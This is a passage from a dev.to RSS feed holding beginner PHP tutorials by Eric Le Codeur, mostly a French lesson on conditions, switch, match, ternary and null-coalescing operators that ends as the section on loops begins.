&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nv"&gt;$a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$a&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nf"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'10'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="c1"&gt;// TypeError&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here an error is returned because the type of the parameter is not an integer&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h2&gt;

&lt;p&gt;That's it for today, I'll be releasing a new article every two days or so. To be sure not to miss anything you can follow me on twitter: &lt;a href="https://twitter.com/EricTheCoder_"&gt;Follow @EricTheCoder_&lt;/a&gt;&lt;/p&gt;

</description>
      <category>php</category>
      <category>backends</category>
      <category>tutorial</category>
      <category>beginners</category>
    </item>
    <item>
      <title>Apprendre le PHP : Conditions, boucles et fonctions</title>
      <author> Eric Le Codeur</author>
      <pubDate>Sun, 23 Jan 2022 18:02:22 +0000</pubDate>
      <link>https://dev.to/ericlecodeur/apprendre-le-php-conditions-boucles-et-fonctions-1ed1</link>
      <guid>https://dev.to/ericlecodeur/apprendre-le-php-conditions-boucles-et-fonctions-1ed1</guid>
      <description>&lt;p&gt;Aujourd'hui, vous apprendrez les conditions, les boucles et les fonctions&lt;/p&gt;

&lt;p&gt;Ce cours accéléré PHP est gratuit et sera publié ici sur dev.to. Je publierai un nouvel article tous les deux jours environ. Pour ne rien manquer, vous pouvez me suivre sur twitter : &lt;a href="https://twitter.com/EricLeCodeur"&gt;Follow @EricLeCodeur&lt;/a&gt;&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#ex%C3%A9cution-conditionnelle"&gt;
  &lt;/a&gt;
  Exécution conditionnelle
&lt;/h1&gt;

&lt;p&gt;En PHP, il est possible d’exécuter une ligne de code seulement si une condition est vraie.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$name&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;'Mike'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Hello Mike'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Le code inclut entre les parenthèses est ce que l’on appel une expression. PHP va exécuter ce code et retourner sa valeur booléenne (vrai ou faux). &lt;/p&gt;

&lt;p&gt;Si le résultat est ‘vrai’ alors le code contenu entre les { } sera exécuté.&lt;/p&gt;

&lt;p&gt;Si le résultat est faux, rien ne sera exécuté dans ce bloc 'if'&lt;/p&gt;

&lt;p&gt;Voici un autre exemple avec l’opérateur plus grand que '&amp;gt;'&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;
&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Livraison gratuite'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Il est possible d’exécuter du code si la condition est fausse&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;120&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Livraison gratuite'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Livraison 9.95$'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Ici le mot-clé 'else' exécute le code si l’expression est ‘false’&lt;/p&gt;

&lt;p&gt;Enfin, il est possible d’avoir plusieurs conditions&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;120&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Livraison gratuite'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;elseif&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;50&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Livraison 9.95$'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Livraison 19.95$'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Le mot-clé 'elseif' permet de tester une autre condition. À noter que cette condition sera testée seulement si la première condition est fausse.&lt;/p&gt;

&lt;p&gt;Si la première et la deuxième condition sont fausses, alors le code dans la section 'else' sera exécuté.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#op%C3%A9rateur-de-comparaison"&gt;
  &lt;/a&gt;
  Opérateur de comparaison
&lt;/h3&gt;

&lt;p&gt;Voici les différents opérateurs qui peuvent être utilisés dans les expressions.&lt;/p&gt;

&lt;p&gt;==   equal no type check&lt;br&gt;
===   equal with type check&lt;br&gt;
!=   not equal&lt;br&gt;
||   or&lt;br&gt;
&amp;amp;&amp;amp;   and&lt;br&gt;
&amp;gt;   greater than&lt;br&gt;
&amp;lt;   less than&lt;/p&gt;

&lt;p&gt;il est possible de tester plusieurs expressions en même temps avec l’opérateur &amp;amp;&amp;amp;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;50&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Le prix est entre 1 et 49'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Le même principe s’applique pour l’opérateur ou ||&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Le prix est 100$ ou 200$'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Les expressions sans opérateur de comparaison&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$amount&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Le montant n est pas de zéro'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Ici l’expression ($amount) ne contient pas d’opérateur de comparaison, malgré ce fait, ce code est valide. Pourquoi ? En PHP chaque expression est convertie en valeur booléenne. Donc ici 0 est convertie en faux. Toute autre valeur autre que zéro (ou null) serait convertie en vrai.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#convertion-en-valeur-bool%C3%A9enne"&gt;
  &lt;/a&gt;
  Convertion en valeur booléenne
&lt;/h3&gt;

&lt;p&gt;Voici la liste des valeurs qui seront converties en &lt;strong&gt;false&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;false&lt;/p&gt;

&lt;p&gt;0&lt;/p&gt;

&lt;p&gt;0.0&lt;/p&gt;

&lt;p&gt;null&lt;/p&gt;

&lt;p&gt;‘0’ (string égale à zéro)&lt;/p&gt;

&lt;p&gt;‘ ’ (string vide)&lt;/p&gt;

&lt;p&gt;&lt;a href="https://dev.totableau%20vide"&gt; &lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Toutes les autres valeurs seront converties en &lt;strong&gt;true&lt;/strong&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#voici-quelques-exemples-de-conversion-en-valeur-bool%C3%A9enne"&gt;
  &lt;/a&gt;
  Voici quelques exemples de conversion en valeur booléenne
&lt;/h3&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$messsage&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'Hello World'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$message&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="c1"&gt;// true&lt;/span&gt;
   &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$messsage&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;





&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$value&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Variable is set'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Variable is unset'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#utiliser-les-if-dans-un-fichier-html"&gt;
  &lt;/a&gt;
  Utiliser les 'if' dans un fichier HTML
&lt;/h3&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight html"&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;html&lt;/span&gt; &lt;span class="na"&gt;lang=&lt;/span&gt;&lt;span class="s"&gt;"en"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;

&lt;span class="nt"&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
    &lt;span class="cp"&gt;&amp;lt;?php $isAdmin = true; ?&amp;gt;&lt;/span&gt;

    &lt;span class="nt"&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Home page&lt;span class="nt"&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;

    &lt;span class="cp"&gt;&amp;lt;?php if ($isAdmin) : ?&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;p&amp;gt;&lt;/span&gt;Welcome Administrator&lt;span class="nt"&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
    &lt;span class="cp"&gt;&amp;lt;?php else : ?&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;p&amp;gt;&lt;/span&gt;Welcome Guest&lt;span class="nt"&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
    &lt;span class="cp"&gt;&amp;lt;?php endif ?&amp;gt;&lt;/span&gt;

&lt;span class="nt"&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;

&lt;span class="nt"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Chaque bloc de code PHP a une balise d’ouverture et de fermeture. La particularité ici c’est le bloc de code du &lt;strong&gt;if&lt;/strong&gt; et du &lt;strong&gt;else&lt;/strong&gt; . Il n’y a pas { }. Il est possible d’utiliser les : à la place.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#switch"&gt;
  &lt;/a&gt;
  Switch
&lt;/h3&gt;

&lt;p&gt;Si nous avons plusieurs conditions, les 'if', 'elseif' etc.. peuvent donner un code difficile à lire. Dans ce cas l’instruction 'switch' permet justement d’aider à simplifier votre code.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;switch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$color&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="s1"&gt;'red'&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Danger'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
         &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="s1"&gt;'yellow'&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Warning'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="s1"&gt;'green'&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'Success'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;default&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'The color is unknown'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;La première ligne représente l’expression que nous désirons évaluer : switch($color)&lt;/p&gt;

&lt;p&gt;Ensuite suffit d’inclure les “case” possible.&lt;/p&gt;

&lt;p&gt;La fonction “break” empêche l’exécution de continuer&lt;/p&gt;

&lt;p&gt;Le “case” default est utilisé s'il y a aucun case qui correspond.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#match"&gt;
  &lt;/a&gt;
  Match
&lt;/h3&gt;

&lt;p&gt;Nouveauté PHP 8.1, cette instruction permet de retourner une expression selon une correspondance clé ⇒valeur&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$type&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;match&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$color&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="s1"&gt;'red'&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="s1"&gt;'danger'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;'yellow'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'orange'&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="s1"&gt;'warning'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;'green'&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="s1"&gt;'success'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="s1"&gt;'Unknown'&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;La première ligne représente l’expression que nous désirons vérifier la correspondance: &lt;strong&gt;match&lt;/strong&gt;($color)&lt;/p&gt;

&lt;p&gt;Sur la deuxième ligne on remarque qu’il est possible de correspondre plus d’une expression à la fois.&lt;/p&gt;

&lt;p&gt;Ensuite s’en suit une liste de &lt;strong&gt;clé&lt;/strong&gt; ⇒ &lt;strong&gt;valeur&lt;/strong&gt;. Si aucune &lt;strong&gt;clé&lt;/strong&gt;→&lt;strong&gt;valeur&lt;/strong&gt; n’est trouvé, la clé &lt;strong&gt;default&lt;/strong&gt; sera exécutée.&lt;/p&gt;

&lt;p&gt;À noter que la clé peut être une expression et que la valeur peut être également, une expression et même une fonction.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$type&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;match&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$color&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;userID&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nf"&gt;openAdmin&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;
    &lt;span class="n"&gt;userID&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;userID&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nf"&gt;openUser&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;
    &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nf"&gt;openOther&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#switch-ou-match-"&gt;
  &lt;/a&gt;
  Switch ou Match ?
&lt;/h3&gt;

&lt;p&gt;Chacun possède des plus. &lt;strong&gt;Match&lt;/strong&gt; est plus simple visuellement mais &lt;strong&gt;Switch&lt;/strong&gt; permet d’exécuter plus d’une ligne de code pour chaque “case”. &lt;strong&gt;Match&lt;/strong&gt; permet de retourner une valeur ce que &lt;strong&gt;Switch&lt;/strong&gt; ne fait pas. Bref moi j’utilise &lt;strong&gt;Match&lt;/strong&gt; si possible car je trouve l’instruction plus épurée visuellement mais sinon je n'ai pas de problème avec l’instruction &lt;strong&gt;switch&lt;/strong&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#ternary-operator-"&gt;
  &lt;/a&gt;
  Ternary operator  ?:
&lt;/h3&gt;

&lt;p&gt;C’est une syntaxe raccourcie pour un if...else. &lt;/p&gt;

&lt;p&gt;Voici un exemple avec if...else&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$isValid&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'user valid'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'user not valid'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Voici le même exemple mais avec l’opérateur Ternary&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$isValid&lt;/span&gt; &lt;span class="o"&gt;?&lt;/span&gt; &lt;span class="s1"&gt;'user valid'&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;'user not valid'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Si l’expression qui précède L’opérateur “?” est vraie alors la valeur suivant “?” sera utilisé, sinon c’est la valeur suivant les “:” qui sera utilisé.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#lop%C3%A9rateur-de-coalescence-null-"&gt;
  &lt;/a&gt;
  L'opérateur de coalescence Null ??
&lt;/h3&gt;

&lt;p&gt;L'opérateur de coalescence Null renvoie son premier opérande s'il existe et n'est pas NULL ; sinon il renvoie son deuxième opérande&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$name&lt;/span&gt; &lt;span class="o"&gt;??&lt;/span&gt; &lt;span class="s1"&gt;'Mike'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  &lt;span class="c1"&gt;//output 'Mike' if $name is null&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#assignation-avec-lop%C3%A9rateur-de-coalescence-null-"&gt;
  &lt;/a&gt;
  Assignation avec l'opérateur de coalescence Null ??
&lt;/h3&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="nv"&gt;$name&lt;/span&gt; &lt;span class="o"&gt;??=&lt;/span&gt; &lt;span class="s1"&gt;'Mike'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Assigne la valeur ‘Mike’ si la variable $name est null&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#op%C3%A9rateur-null-safe"&gt;
  &lt;/a&gt;
  Opérateur Null safe
&lt;/h3&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight php"&gt;&lt;code&gt;&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$user&lt;/span&gt;&lt;span class="o"&gt;?-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;profile&lt;/span&gt;&lt;span class="o"&gt;?-&amp;gt;&lt;/span&gt;&lt;span class="nf"&gt;activate&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Si une des variables qui précède l’opérateur “?” est null alors la valeur de l’expression sera null&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#les-boucles"&gt;
  &lt;/a&gt;
  Les boucles
&lt;/h1&gt;

&lt;h3&gt;
  &lt;a href="#la-boucle-while"&gt;
  &lt;/a&gt;
  La boucle “while”
&lt;/h3&gt;

&lt;p&gt;Permet d’exécuter un block de code un certain nombre de fois. Le nombre de fois va dépendre de la condition. Tantque la condition est vrai, le block de code va s’exécuter.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
